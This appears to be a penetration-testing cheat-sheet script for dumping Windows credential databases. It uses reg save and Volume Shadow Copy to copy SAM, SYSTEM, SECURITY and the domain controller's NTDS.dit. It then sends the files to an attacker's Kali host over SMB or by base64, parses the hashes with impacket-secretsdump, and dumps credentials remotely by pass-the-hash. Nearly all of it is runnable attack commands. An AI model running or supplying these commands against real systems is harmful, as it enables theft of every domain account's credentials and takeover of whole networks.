# ============================================================
# SAM / SYSTEM / NTDS Extraction
# ============================================================
# The SAM database stores local user NTLM hashes.
# SYSTEM contains the boot key needed to decrypt SAM.
# NTDS.dit is the Active Directory database (domain credentials).
#
# REQUIRES: Admin privileges
#
# Parse on Kali with impacket-secretsdump:
#   impacket-secretsdump -sam SAM -system SYSTEM LOCAL
#   impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# ============================================================


# ============================================================
# METHOD 1: reg save (registry export — live system)
# ============================================================
# The SAM and SYSTEM hives are locked while Windows runs.
# 'reg save' uses the Volume Shadow Copy API internally to
# get a consistent snapshot — bypasses the lock.
#
# REQUIRES: Admin

reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Or from PowerShell:
# & reg.exe save HKLM\SAM C:\Windows\Temp\SAM
# & reg.exe save HKLM\SYSTEM C:\Windows\Temp\SYSTEM


# ============================================================
# METHOD 2: Volume Shadow Copy (bypasses protected files)
# ============================================================
# Creates a snapshot of the C: drive, then copies the hive
# files out of the snapshot (no file lock issue).

# Create shadow copy:
wmic shadowcopy call create Volume='C:\'

# List available shadow copies (note the shadow copy path):
vssadmin list shadows

# Copy from shadow (adjust shadow path from above):
$shadow = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
cmd /c "copy $shadow\Windows\System32\config\SAM C:\Windows\Temp\SAM"
cmd /c "copy $shadow\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM"
cmd /c "copy $shadow\Windows\System32\config\SECURITY C:\Windows\Temp\SECURITY"


# ============================================================
# METHOD 3: NTDS.dit (Active Directory — Domain Controller only)
# ============================================================
# NTDS.dit holds ALL domain account hashes. On a DC, this is
# the jackpot. It's locked by the AD service — use VSS.

# On a Domain Controller:
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows

# Copy NTDS:
$shadow = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
cmd /c "copy $shadow\Windows\NTDS\NTDS.dit C:\Windows\Temp\NTDS.dit"
cmd /c "copy $shadow\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM"

# Parse on Kali:
# impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
# impacket-secretsdump -ntds NTDS.dit -system SYSTEM -hashes :NTLM LOCAL -just-dc-ntlm


# ============================================================
# Transfer files back to Kali
# ============================================================

# Kali: set up SMB receiver
# sudo impacket-smbserver share . -smb2support

# Victim:
$kali = "192.168.45.202"
net use \\$kali\share
copy C:\Windows\Temp\SAM \\$kali\share\SAM
copy C:\Windows\Temp\SYSTEM \\$kali\share\SYSTEM
copy C:\Windows\Temp\SECURITY \\$kali\share\SECURITY

# Alternative: base64 encode and copy-paste (no network needed)
$b = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\SAM")
[Convert]::ToBase64String($b) | Out-File C:\Windows\Temp\sam.b64
type C:\Windows\Temp\sam.b64
# Kali: cat sam.b64 | base64 -d > SAM


# ============================================================
# Parse on Kali
# ============================================================
# Local SAM + SYSTEM:
# impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Full (SAM + SECURITY for LSA secrets):
# impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# NTDS (domain):
# impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

# Remote (pass-the-hash to dump remotely — no files needed):
# impacket-secretsdump -hashes :NTLMHASH Administrator@TARGET_IP
# impacket-secretsdump -hashes :NTLMHASH 'DOMAIN\Administrator'@TARGET_IP
